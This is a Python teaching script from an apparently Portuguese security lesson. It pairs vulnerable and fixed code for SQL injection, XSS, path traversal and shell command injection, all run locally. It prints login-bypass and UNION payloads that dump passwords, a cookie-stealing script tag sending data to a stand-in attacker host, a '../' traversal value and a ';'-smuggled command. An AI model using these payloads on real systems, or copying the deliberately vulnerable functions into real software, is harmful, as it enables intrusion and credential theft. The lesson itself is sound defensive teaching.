# L6. Seguranca em aplicacoes: injecao de SQL, XSS, travessia de diretorio e injecao de comando (tudo local e inofensivo)
import sqlite3, html, os, subprocess, tempfile
db = sqlite3.connect(":memory:")
db.executescript("""
CREATE TABLE usuarios(id INTEGER PRIMARY KEY, nome TEXT, senha TEXT, papel TEXT);
INSERT INTO usuarios VALUES (1,'ana','s3cr3ta-ana','servidor'),(2,'admin','Adm!n-9z','administrador');
CREATE TABLE processos(id INTEGER PRIMARY KEY, titulo TEXT, sigilo INTEGER);
INSERT INTO processos VALUES (1,'Contratacao de TI',0),(2,'Auditoria reservada',1);
""")
def login_vulneravel(nome, senha):
    q = f"SELECT nome, papel FROM usuarios WHERE nome='{nome}' AND senha='{senha}'"
    return q, db.execute(q).fetchall()
def login_seguro(nome, senha):
    q = "SELECT nome, papel FROM usuarios WHERE nome=? AND senha=?"
    return q, db.execute(q, (nome, senha)).fetchall()
print("== 1. A05 Injecao de SQL: contornar o login ==")
for nome, senha in (("ana", "errada"), ("admin", "' OR '1'='1"), ("admin'--", "qualquer")):
    q, r = login_vulneravel(nome, senha)
    print("consulta montada por concatenacao:", q)
    print("  resultado:", r if r else "nenhuma linha (login negado)")
print("\n== 2. A mesma entrada contra a consulta parametrizada ==")
for nome, senha in (("admin", "' OR '1'='1"), ("admin'--", "qualquer"), ("ana", "s3cr3ta-ana")):
    q, r = login_seguro(nome, senha)
    print(f"entrada ({nome!r}, {senha!r}) ->", r if r else "nenhuma linha (login negado)")
print("consulta usada:", q, "(o valor viaja separado do comando)")
print("\n== 3. UNION: exfiltrar outra tabela por um parametro de busca ==")
def busca_vuln(t): return f"SELECT id, titulo FROM processos WHERE sigilo=0 AND titulo LIKE '%{t}%'"
atq = "x%' UNION SELECT id, senha FROM usuarios --"
q = busca_vuln(atq); print("consulta:", q); print("  resultado:", db.execute(q).fetchall())
print("  versao segura:", db.execute("SELECT id, titulo FROM processos WHERE sigilo=0 AND titulo LIKE ?", (f"%{atq}%",)).fetchall())
print("\n== 4. A05 XSS: escapar a saida (codificacao de saida) ==")
comentario = '<script>fetch("https://atacante.exemplo/?c="+document.cookie)</script>'
print("sem escape :", f"<p>{comentario}</p>")
print("com escape :", f"<p>{html.escape(comentario)}</p>")
print("\n== 5. A01 Travessia de diretorio (path traversal) ==")
base = tempfile.mkdtemp(prefix="m10l6_"); os.makedirs(base + "/publico")
open(base + "/publico/edital.txt", "w").write("edital publico\n"); open(base + "/segredo.txt", "w").write("conteudo interno\n")
def abre_vuln(nome): return open(os.path.join(base, "publico", nome)).read().strip()
def abre_seguro(nome):
    p = os.path.realpath(os.path.join(base, "publico", nome))
    if os.path.commonpath([p, os.path.join(os.path.realpath(base), "publico")]) != os.path.join(os.path.realpath(base), "publico"):
        raise PermissionError("fora do diretorio permitido")
    return open(p).read().strip()
print("vulneravel, nome='edital.txt'      ->", abre_vuln("edital.txt"))
print("vulneravel, nome='../segredo.txt'  ->", abre_vuln("../segredo.txt"))
print("seguro,     nome='edital.txt'      ->", abre_seguro("edital.txt"))
try: abre_seguro("../segredo.txt")
except PermissionError as e: print("seguro,     nome='../segredo.txt'  -> PermissionError:", e)
print("\n== 6. Injecao de comando: shell=True x lista de argumentos (so executa echo) ==")
entrada = "relatorio; echo COMANDO-INJETADO"
r1 = subprocess.run(f"echo arquivo: {entrada}", shell=True, capture_output=True, text=True).stdout
r2 = subprocess.run(["echo", "arquivo:", entrada], capture_output=True, text=True).stdout
print("shell=True    ->", repr(r1))
print("lista de args ->", repr(r2))
